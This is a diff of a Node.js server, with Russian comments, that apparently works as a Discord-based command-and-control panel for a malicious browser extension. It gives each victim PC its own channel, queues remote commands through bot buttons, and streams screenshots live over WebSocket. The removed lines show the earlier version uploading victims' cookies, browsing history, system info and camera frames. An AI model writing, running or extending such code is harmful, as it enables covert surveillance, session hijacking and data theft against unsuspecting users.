@@ -1,4 +1,3 @@
-// server.js
 import express from "express";
 import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
 import { WebSocketServer } from "ws";
@@ -15,14 +14,14 @@ app.use(express.json({ limit: "50mb" }));
 const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
 const GUILD_ID = process.env.GUILD_ID;
 const CATEGORY_NAME = "Все ПК";
-const ONLINE_TIMEOUT = 3 * 60 * 1000; // 3 минуты
+const ONLINE_TIMEOUT = 3 * 60 * 1000;
 
 // ---------- Состояние ----------
-const onlinePCs = {};           // pcId -> timestamp
-const pendingCommands = {};     // pcId -> array of commands
-const channelByPC = {};         // pcId -> channelId
-const wsClients = {};           // pcId -> array of ws
-const messagesWithButtons = {}; // pcId -> messageId
+const onlinePCs = {};
+const pendingCommands = {};
+const channelByPC = {};
+const wsClients = {};
+const messagesWithButtons = {};
 
 // ---------- Discord Bot ----------
 const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
@@ -43,25 +42,28 @@ function createControlButtons(pcId) {
 // ---------- Обработка кнопок ----------
 bot.on("interactionCreate", async interaction => {
     if(!interaction.isButton()) return;
-
     const [command, encodedPcId] = interaction.customId.split("|");
     const pcId = decodeURIComponent(encodedPcId);
     const lastPing = onlinePCs[pcId];
     const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);
 
+    const replyOptions = { ephemeral: true }; // обновленный формат
     if(command === "check_online") {
-        await interaction.reply({ content: isOnline ? `✅ ПК ${pcId} онлайн` : `❌ ПК ${pcId} оффлайн`, ephemeral:true });
+        replyOptions.content = isOnline ? `✅ ПК ${pcId} онлайн` : `❌ ПК ${pcId} оффлайн`;
+        await interaction.reply(replyOptions);
         return;
     }
 
     if(!isOnline){
-        await interaction.reply({ content: `❌ ПК ${pcId} оффлайн`, ephemeral:true });
+        replyOptions.content = `❌ ПК ${pcId} оффлайн`;
+        await interaction.reply(replyOptions);
         return;
     }
 
     if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
     pendingCommands[pcId].push(command);
-    await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral:true });
+    replyOptions.content = `✅ Команда "${command}" отправлена ПК ${pcId}`;
+    await interaction.reply(replyOptions);
 });
 
 // ---------- Категория и канал ----------
@@ -79,10 +81,10 @@ async function getOrCreateTextChannel(guild, name, parentId){
     return channel;
 }
 
-// ---------- Приём данных от расширения ----------
+// ---------- Приём данных ----------
 app.post("/upload", async (req, res) => {
     try {
-        const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot } = req.body;
+        const { pcId, screenshot } = req.body;
         if(!pcId) return res.status(400).json({ error:"pcId required" });
 
         onlinePCs[pcId] = Date.now();
@@ -92,24 +94,21 @@ app.post("/upload", async (req, res) => {
         const finalChannel = channel || await getOrCreateTextChannel(guild, pcId, category.id);
         channelByPC[pcId] = finalChannel.id;
 
-        // ---------- Отправка файлов ----------
-        const files = [];
-        if(cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
-        if(history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
-        if(systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${pcId}-system.json` });
-        if(screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });
-
-        if(files.length) await finalChannel.send({ files });
-
-        // ---------- Кнопки ----------
-        if(messagesWithButtons[pcId]){
+        // ---------- Отправка скриншота ----------
+        if(screenshot){
             try {
-                const oldMsg = await finalChannel.messages.fetch(messagesWithButtons[pcId]);
-                if(oldMsg) await oldMsg.delete();
-            } catch(e){}
+                await finalChannel.send({ files: [{ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` }] });
+            } catch(e) {
+                console.error("Ошибка отправки скриншота:", e);
+            }
         }
-        const newMsg = await finalChannel.send({ content: `Управление ПК ${pcId}`, components: createControlButtons(pcId) });
-        messagesWithButtons[pcId] = newMsg.id;
+
+        // ---------- WS ----------
+        if(screenshot && wsClients[pcId]){
+            wsClients[pcId].forEach(ws => {
+                try { ws.send(screenshot); } catch(e){ }
+            });
+        }
 
         res.json({ success:true });
     } catch(err){
@@ -118,48 +117,28 @@ app.post("/upload", async (req, res) => {
     }
 });
 
-// ---------- Пинг от расширения ----------
+// ---------- Пинг ----------
 app.post("/ping", (req, res) => {
     const { pcId } = req.body;
     if(!pcId) return res.status(400).json({ error:"pcId required" });
-
     onlinePCs[pcId] = Date.now();
     const commands = pendingCommands[pcId] || [];
     pendingCommands[pcId] = [];
     res.json({ commands });
 });
 
-// ---------- Приём кадров с камеры ----------
-app.post("/upload_cam", (req, res) => {
-    const { pcId, screenshot } = req.body;
-    if(!pcId || !screenshot) return res.status(400).json({ error:"pcId and screenshot required" });
-
-    // Отправка всем подключённым клиентам WS
-    if(wsClients[pcId]){
-        wsClients[pcId].forEach(ws => {
-            if(ws.readyState === ws.OPEN) ws.send(screenshot);
-        });
-    }
-    res.json({ success:true });
-});
-
 // ---------- Статика ----------
-app.use(express.static(join(__dirname, "public"))); // HTML/JS клиент
+app.use(express.static(join(__dirname, "public")));
 
 // ---------- WebSocket ----------
 const wss = new WebSocketServer({ noServer: true });
-
 wss.on("connection", (ws, req) => {
     const url = new URL(req.url, `http://${req.headers.host}`);
     const pcId = url.searchParams.get("pcId");
     if(!pcId) return ws.close();
-
     if(!wsClients[pcId]) wsClients[pcId] = [];
     wsClients[pcId].push(ws);
-
-    ws.on("close", () => {
-        wsClients[pcId] = wsClients[pcId].filter(c => c !== ws);
-    });
+    ws.on("close", () => { wsClients[pcId] = wsClients[pcId].filter(c => c !== ws); });
 });
 
 // ---------- HTTP + WS ----------
